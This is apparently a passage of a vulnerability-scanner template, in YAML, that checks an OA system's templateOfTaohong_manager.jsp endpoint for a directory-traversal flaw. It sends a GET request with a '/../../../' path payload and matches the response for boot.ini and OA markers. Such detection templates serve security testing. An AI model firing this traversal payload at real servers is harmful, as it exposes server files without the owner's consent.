      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - boot.ini
          - '[FE_MESSAGE_PUSH]'
          - '[OA]'
        condition: and
    method: GET
    path:
      - '{{BaseURL}}/system/mediafile/templateOfTaohong_manager.jsp?path=/../../../'
